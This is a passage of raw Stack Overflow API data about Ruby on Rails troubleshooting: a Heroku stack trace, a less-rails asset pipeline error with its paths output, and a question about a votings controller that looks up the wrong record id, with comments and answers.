vendor/bundle/ruby/2.3.0/gems/rack-2.0.3/lib/rack/conditional_get.rb:25:in\n  <code>call' 2017-11-29T15:56:56.588328+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/middleware/callbacks.rb:26:in\n  </code>block in call' 2017-11-29T15:56:56.588330+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/callbacks.rb:97:in\n  <code>run_callbacks' 2017-11-29T15:56:56.588339+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/tagged_logging.rb:69:in\n  </code>block in tagged' 2017-11-29T15:56:56.588333+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/middleware/show_exceptions.rb:31:in\n  <code>call' 2017-11-29T15:56:56.588343+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/middleware/request_id.rb:25:in\n  </code>call' 2017-11-29T15:56:56.588343+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/rack-2.0.3/lib/rack/method_override.rb:22:in\n  <code>call' 2017-11-29T15:56:56.588347+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/rack-2.0.3/lib/rack/sendfile.rb:111:in\n  </code>call' 2017-11-29T15:56:56.588342+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/middleware/remote_ip.rb:79:in\n  <code>call' 2017-11-29T15:56:56.588322+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/routing/route_set.rb:834:in\n  </code>call' 2017-11-29T15:56:56.588331+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/middleware/callbacks.rb:24:in\n  <code>call' 2017-11-29T15:56:56.588340+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/tagged_logging.rb:26:in\n  </code>tagged' 2017-11-29T15:56:56.588346+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/middleware/static.rb:125:in\n  <code>call' 2017-11-29T15:56:56.588350+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/puma-3.10.0/lib/puma/server.rb:437:in\n  </code>process_client' 2017-11-29T15:56:56.588348+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/railties-5.1.4/lib/rails/engine.rb:522:in\n  <code>call' 2017-11-29T15:56:56.588345+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/cache/strategy/local_cache_middleware.rb:27:in\n  </code>call' 2017-11-29T15:56:56.588344+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/rack-2.0.3/lib/rack/runtime.rb:22:in\n  <code>call' 2017-11-29T15:56:56.588335+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/railties-5.1.4/lib/rails/rack/logger.rb:24:in\n  </code>block in call' 2017-11-29T15:56:56.588351+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/puma-3.10.0/lib/puma/thread_pool.rb:120:in\n  <code>block in spawn_thread' 2017-11-29T15:56:56.588327+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/rack-2.0.3/lib/rack/session/abstract/id.rb:226:in\n  </code>call' 2017-11-29T15:56:56.588346+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/middleware/executor.rb:12:in\n  <code>call' 2017-11-29T15:56:56.588349+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/puma-3.10.0/lib/puma/server.rb:605:in\n  </code>handle_request' 2017-11-29T15:56:56.588341+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/tagged_logging.rb:69:in\n  <code>tagged' 2017-11-29T15:56:56.588341+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/railties-5.1.4/lib/rails/rack/logger.rb:24:in\n  </code>call' 2017-11-29T15:56:56.588348+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/puma-3.10.0/lib/puma/configuration.rb:225:in\n  <code>call' 2017-11-29T15:56:56.588350+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/puma-3.10.0/lib/puma/server.rb:301:in\n  </code>block in run'</p>\n</blockquote>\n\n<p>Code for static_pages_controller.rb </p>\n\n<pre><code>class StaticPagesController &lt; ApplicationController\n\ndef home\nend\n\ndef about\nend\n\ndef contact\nend\n\nend\n</code></pre>\n\n<p>and for routes.rb</p>\n\n<pre><code>Rails.application.routes.draw do\n\nget '/about', to: 'static_pages#about'\n\nget '/contact', to: 'static_pages#contact'\n\nroot 'static_pages#home'\n\n\nresources :articles do\nresources :comments\nend\n\n\nend\n</code></pre>\n"}, {"tags": ["ruby", "less", "ruby-on-rails-5", "asset-pipeline", "less-rails"], "comments": [{"owner": {"reputation": 3638, "user_id": 1977104, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1fe5f45f44332caa3a105c05382c8e7b?s=128&d=identicon&r=PG", "display_name": "Wasif Hossain", "link": "https://stackoverflow.com/users/1977104/wasif-hossain"}, "edited": false, "score": 0, "creation_date": 1512045330, "post_id": 47556808, "comment_id": 82103949, "body": "can you please run <code>Rails.application.config.assets.paths</code> in <code>rails console</code> and append the output in this question along with directory structure of relevant assets?"}, {"owner": {"reputation": 1, "user_id": 5707002, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cfebada1bc33ca367c798f19847aeada?s=128&d=identicon&r=PG&f=1", "display_name": "Rijaludin Muhsin", "link": "https://stackoverflow.com/users/5707002/rijaludin-muhsin"}, "reply_to_user": {"reputation": 3638, "user_id": 1977104, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1fe5f45f44332caa3a105c05382c8e7b?s=128&d=identicon&r=PG", "display_name": "Wasif Hossain", "link": "https://stackoverflow.com/users/1977104/wasif-hossain"}, "edited": false, "score": 0, "creation_date": 1512354400, "post_id": 47556808, "comment_id": 82209181, "body": "Hi Wasif I&#39;ve added <code>Rails.application.config.assets.paths</code> output"}], "owner": {"reputation": 1, "user_id": 5707002, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cfebada1bc33ca367c798f19847aeada?s=128&d=identicon&r=PG&f=1", "display_name": "Rijaludin Muhsin", "link": "https://stackoverflow.com/users/5707002/rijaludin-muhsin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 290, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1512354366, "creation_date": 1511970878, "last_edit_date": 1512354366, "question_id": 47556808, "link": "https://stackoverflow.com/questions/47556808/lesserror-expected-expected-got", "title": "Less::Error expected expected &#39;)&#39; got &#39;&#39;&#39;", "body": "<p>Recently I upgraded less-rails gem to 3.0.0. The error raised on stylesheet_link_tag, javascript_include_tag, image_tag and anywhere else that involving asset pipeline.</p>\n\n<p>However when I prepend /assets/ e.g change from\n<code>= stylesheet_link_tag \"application\"</code> to <code>= stylesheet_link_tag \"/assets/application\"</code> it works.</p>\n\n<p>Error trace:\n<code>\nless (2.6.0) lib/less/parser.rb:74:in `block (2 levels) in parse'\nat Parser.parser.parse (less (2.6.0) lib/less/js/lib/less/parser.js:511:24)\nless (2.6.0) lib/less/parser.rb:64:in `block in parse'\nless (2.6.0) lib/less/java_script/v8_context.rb:90:in `block in do_lock'\nless (2.6.0) lib/less/java_script/v8_context.rb:88:in `Locker'\nless (2.6.0) lib/less/java_script/v8_context.rb:88:in `do_lock'\nless (2.6.0) lib/less/java_script/v8_context.rb:60:in `lock'\nless (2.6.0) lib/less/java_script/v8_context.rb:30:in `exec'\nless (2.6.0) lib/less/java_script.rb:26:in `exec'\nless (2.6.0) lib/less/parser.rb:63:in `parse'\nless-rails (3.0.0) lib/less/rails/template_handlers.rb:18:in `evaluate'\ntilt (2.0.8) lib/tilt/template.rb:109:in `render'\ngrease (0.3.1) lib/grease/adapter.rb:12:in `call'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:75:in `call_processor'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:57:in `block in call_processors'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:56:in `reverse_each'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:56:in `call_processors'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:75:in `call_processor'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:57:in `block in call_processors'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:56:in `reverse_each'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:56:in `call_processors'\nsprockets (3.7.1) lib/sprockets/loader.rb:134:in `load_from_unloaded'\nsprockets (3.7.1) lib/sprockets/loader.rb:60:in `block in load'\nsprockets (3.7.1) lib/sprockets/loader.rb:317:in `fetch_asset_from_dependency_cache'\nsprockets (3.7.1) lib/sprockets/loader.rb:44:in `load'\nsprockets (3.7.1) lib/sprockets/cached_environment.rb:20:in `block in initialize'\nsprockets (3.7.1) lib/sprockets/cached_environment.rb:47:in `load'\nsprockets (3.7.1) lib/sprockets/bundle.rb:23:in `block in call'\nsprockets (3.7.1) lib/sprockets/utils.rb:200:in `dfs'\nsprockets (3.7.1) lib/sprockets/bundle.rb:24:in `call'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:75:in `call_processor'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:57:in `block in call_processors'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:56:in `reverse_each'\nsprockets (3.7.1) lib/sprockets/processor_utils.rb:56:in `call_processors'\nsprockets (3.7.1) lib/sprockets/loader.rb:134:in `load_from_unloaded'\nsprockets (3.7.1) lib/sprockets/loader.rb:60:in `block in load'\nsprockets (3.7.1) lib/sprockets/loader.rb:317:in `fetch_asset_from_dependency_cache'\nsprockets (3.7.1) lib/sprockets/loader.rb:44:in `load'\nsprockets (3.7.1) lib/sprockets/cached_environment.rb:20:in `block in initialize'\nsprockets (3.7.1) lib/sprockets/cached_environment.rb:47:in `load'\nsprockets (3.7.1) lib/sprockets/base.rb:66:in `find_asset'\nsprockets (3.7.1) lib/sprockets/base.rb:73:in `find_all_linked_assets'\nsprockets (3.7.1) lib/sprockets/manifest.rb:134:in `block in find'\nsprockets (3.7.1) lib/sprockets/manifest.rb:133:in `each'\nsprockets (3.7.1) lib/sprockets/manifest.rb:133:in `find'\nsprockets-rails (3.2.1) lib/sprockets/railtie.rb:50:in `each'\nsprockets-rails (3.2.1) lib/sprockets/railtie.rb:50:in `map'\nsprockets-rails (3.2.1) lib/sprockets/railtie.rb:50:in `precompiled_assets'\nsprockets-rails (3.2.1) lib/sprockets/railtie.rb:35:in `asset_precompiled?'\nsprockets-rails (3.2.1) lib/sprockets/railtie.rb:251:in `block (3 levels) in &lt;class:Railtie&gt;'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:359:in `precompiled?'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:363:in `raise_unless_precompiled_asset'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:337:in `digest_path'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:325:in `asset_path'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:102:in `block in resolve_asset_path'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:242:in `block in resolve_asset'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:241:in `each'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:241:in `detect'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:241:in `resolve_asset'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:101:in `resolve_asset_path'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:79:in `compute_asset_path'\nactionview (5.0.2) lib/action_view/helpers/asset_url_helper.rb:144:in `asset_path'\nactionview (5.0.2) lib/action_view/helpers/asset_url_helper.rb:254:in `javascript_path'\nactionview (5.0.2) lib/action_view/helpers/asset_tag_helper.rb:61:in `block in javascript_include_tag'\nactionview (5.0.2) lib/action_view/helpers/asset_tag_helper.rb:59:in `map'\nactionview (5.0.2) lib/action_view/helpers/asset_tag_helper.rb:59:in `javascript_include_tag'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:156:in `block in javascript_include_tag'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:154:in `map'\nsprockets-rails (3.2.1) lib/sprockets/rails/helper.rb:154:in `javascript_include_tag'\napp/views/layouts/application.html.haml:185:in `_app_views_layouts_application_html_haml__1636334633396439568_70098641364520'\n</code></p>\n\n<p>I tried removing one by one css and js file but it seems the issue are not with the files. Any idea?</p>\n\n<p>Here is the output when I run <code>Rails.application.config.assets.paths</code> (file paths are ommited) :</p>\n\n<p><code>\n[\"/path/to/rails-project/app/assets/fonts\", \"/path/to/rails-project/app/assets/images\", \"/path/to/rails-project/app/assets/javascripts\", \"/path/to/rails-project/app/assets/stylesheets\", \"/path/to/rails-project/vendor/assets/javascripts\", \"/path/to/rails-project/vendor/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-jcrop-0.9.12/app/assets/images\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-jcrop-0.9.12/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-jcrop-0.9.12/app/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-jcrop-0.9.12/app/assets/templates\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-Sortable-1.4.2/app/assets/images\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-Sortable-1.4.2/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-Sortable-1.4.2/app/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-Sortable-1.4.2/app/assets/templates\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-react-bootstrap-0.28.1/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-react-0.14.3/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails-assets-classnames-2.2.0/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/activeadmin-1.0.0/app/assets/images\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/activeadmin-1.0.0/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/activeadmin-1.0.0/app/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jquery-ui-rails-6.0.1/app/assets/images\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jquery-ui-rails-6.0.1/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jquery-ui-rails-6.0.1/app/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/bourbon-4.3.4/app/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/s3_file_field-1.3.0/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/s3_direct_upload-0.1.7/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/s3_direct_upload-0.1.7/app/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jquery-fileupload-rails-0.4.1/vendor/assets/images\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jquery-fileupload-rails-0.4.1/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jquery-fileupload-rails-0.4.1/vendor/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/browser-timezone-rails-1.0.1/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jstz-rails3-plus-1.0.5/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/js_cookie_rails-2.1.4/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/browser-timezone-rails-1.0.1/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/bootstrap3-datetimepicker-rails-4.17.37/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/bootstrap3-datetimepicker-rails-4.17.37/vendor/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/momentjs-rails-2.11.0/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/bootstrap-datepicker-rails-1.3.0.2/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/bootstrap-datepicker-rails-1.3.0.2/vendor/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/bundler/gems/surveyor-9563ce853417/lib/assets/fonts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/bundler/gems/surveyor-9563ce853417/lib/assets/images\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/bundler/gems/surveyor-9563ce853417/lib/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/bundler/gems/surveyor-9563ce853417/lib/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/turboboost-0.1.1/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jquery-turbolinks-2.1.0/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/formtastic-3.1.5/app/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/rails3-jquery-autocomplete-1.0.14/lib/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/cocoon-1.2.6/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jqcloud-rails-1.0.0/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jqcloud-rails-1.0.0/vendor/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/pickadate-rails-1.5.0/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/pickadate-rails-1.5.0/vendor/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/bootstrap-slider-rails-9.8.0/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/bootstrap-slider-rails-9.8.0/vendor/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/twitter-bootstrap-rails-3.2.2/app/assets/fonts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/twitter-bootstrap-rails-3.2.2/app/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/twitter-bootstrap-rails-3.2.2/app/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/twitter-bootstrap-rails-3.2.2/vendor/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/font-awesome-rails-4.7.0.2/app/assets/fonts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/font-awesome-rails-4.7.0.2/app/assets/stylesheets\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/jquery-rails-4.3.1/vendor/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/coffee-rails-4.2.2/lib/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/actioncable-5.0.2/lib/assets/compiled\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/turbolinks-source-5.0.3/lib/assets/javascripts\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/react-rails-2.2.1/lib/assets/react-source/development-with-addons\", \"/Users/my-username/.rvm/gems/ruby-2.4.2@gemset-name/gems/react-rails-2.2.1/lib/assets/javascripts/\"]\n</code></p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 3, "creation_date": 1511970450, "post_id": 47556587, "comment_id": 82070638, "body": "What do you mean by &quot;I don&#39;t get options right&quot;? What error/unexpected behaviour do you see? What does the log show?"}, {"owner": {"reputation": 11, "user_id": 9026514, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c92c1e3397d4e4be58d4e69958cf4b0?s=128&d=identicon&r=PG&f=1", "display_name": "Fly", "link": "https://stackoverflow.com/users/9026514/fly"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511970652, "post_id": 47556587, "comment_id": 82070789, "body": "at the moment, it&#39;s &quot;Couldn&#39;t find Option with &#39;id&#39;=30&quot; it seems he doesn&#39;t like the show action, but I&#39;m not sure if this is the source of the problem"}, {"owner": {"reputation": 155, "user_id": 8733981, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sSUg7.png?s=128&g=1", "display_name": "rks", "link": "https://stackoverflow.com/users/8733981/rks"}, "edited": false, "score": 1, "creation_date": 1511970727, "post_id": 47556587, "comment_id": 82070851, "body": "How are you getting option_id 30? may be option with id 30 is already deleted"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1511971133, "post_id": 47556587, "comment_id": 82071120, "body": "You said &quot;Everything works fine for just creating and showing&quot;. Now you say &quot;it seems he doesn&#39;t like the show action&quot;. So I&#39;m confused what you&#39;re saying is broken. However, this line: <code>@option = Option.find(params[:id])</code> looks dubious to me since this is the <code>VotingsController</code>; I&#39;d expect <code>params[:id]</code> to be the <code>Voting</code> id, not the <code>Option</code> id."}, {"owner": {"reputation": 11, "user_id": 9026514, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c92c1e3397d4e4be58d4e69958cf4b0?s=128&d=identicon&r=PG&f=1", "display_name": "Fly", "link": "https://stackoverflow.com/users/9026514/fly"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511971495, "post_id": 47556587, "comment_id": 82071368, "body": "@TomLord Yes, it worked fine for creating and showing a VOTING, but since I added the option part (option belongs_to voting) it fails."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511971859, "post_id": 47556587, "comment_id": 82071618, "body": "Oh, right... So a previous version of the code (that you haven&#39;t shown) is what works :) -- I go back to my previous comment then: The <code>params[:id]</code> is presumably the <code>Voting</code> id; you&#39;re searching for the wrong thing. In addition, if a <code>Voting</code> has <b>many</b> <code>options</code>, then you need to update the UI to show <i>all</i> of them."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 9026514, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c92c1e3397d4e4be58d4e69958cf4b0?s=128&d=identicon&r=PG&f=1", "display_name": "Fly", "link": "https://stackoverflow.com/users/9026514/fly"}, "edited": false, "score": 0, "creation_date": 1512031050, "post_id": 47558966, "comment_id": 82095514, "body": "thank you, at first.  okay, that &quot;user&quot; thing shouldn&#39;t be there at all, I think I was too tired yesterday... I tried out so many different things, it seems to be a leftover of shame, I&#39;m sorry! I edited it out to avoid further confusion.  And yes, my routes file defines <code>resourses:votings</code>."}], "tags": [], "owner": {"reputation": 13091, "user_id": 385532, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/082cc70175616a7f63b134a741c5d6e3?s=128&d=identicon&r=PG", "display_name": "Matt", "link": "https://stackoverflow.com/users/385532/matt"}, "is_accepted": false, "score": 0, "last_activity_date": 1511978379, "creation_date": 1511978379, "answer_id": 47558966, "question_id": 47556587, "link": "https://stackoverflow.com/questions/47556587/ruby-on-rails-5-1-4-couldnt-find-model-id/47558966#47558966", "title": "Ruby on Rails 5.1.4 couldn&#39;t find Model id", "body": "<p>Your question is a bit scarce on details, so I'll just point out the obvious and hope it helps. </p>\n\n<p>Your voting controller show action uses what a resourceful app would expect to be a <strong>voting</strong> object ID to find an <strong>option</strong> object. </p>\n\n<pre><code>class VotingsController &lt; ApplicationController\n  def show\n    @option = Option.find(params[:id]) # In a resource route this is a voting id!\n    @voting = @option.user # what is option.user? Should be option.voting?\n  end\n</code></pre>\n\n<p>This assumes your routes file defines <code>resources :votings</code> ?</p>\n"}, {"tags": [], "owner": {"reputation": 5669, "user_id": 7429104, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/TZAPt.jpg?s=128&g=1", "display_name": "Aman", "link": "https://stackoverflow.com/users/7429104/aman"}, "is_accepted": false, "score": 0, "last_activity_date": 1511979123, "creation_date": 1511979123, "answer_id": 47559177, "question_id": 47556587, "link": "https://stackoverflow.com/questions/47556587/ruby-on-rails-5-1-4-couldnt-find-model-id/47559177#47559177", "title": "Ruby on Rails 5.1.4 couldn&#39;t find Model id", "body": "<p>I can explain your problem as simple answer hopefully it will help you debug your doubt.</p>\n\n<pre><code>  def create\n    @voting = Voting.new(voting_params)\n\n    @voting.save\n    redirect_to @voting\n  end\n</code></pre>\n\n<p>in this action after creating <code>@voting</code> it been redirected to <code>show</code> action as <code>redirect_to @voting</code> which will create a link link this</p>\n\n<pre><code>/voting/:id\n</code></pre>\n\n<p>here in show action we are sending voting's id, so its clear straight that in <code>show</code> action when we will try to get <code>params[:id]</code> it will be voting's id not the option's id\nbasically here it should be</p>\n\n<pre><code>  def show\n    @voting = Voting.find(params[:id])\n    @options = @voting.options\n  end\n</code></pre>\n\n<p>hopefully it will help you to debug your doubt, i m not sure what you what, let me know for further guidance. thanks</p>\n"}, {"comments": [{"owner": {"reputation": 11, "user_id": 9026514, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c92c1e3397d4e4be58d4e69958cf4b0?s=128&d=identicon&r=PG&f=1", "display_name": "Fly", "link": 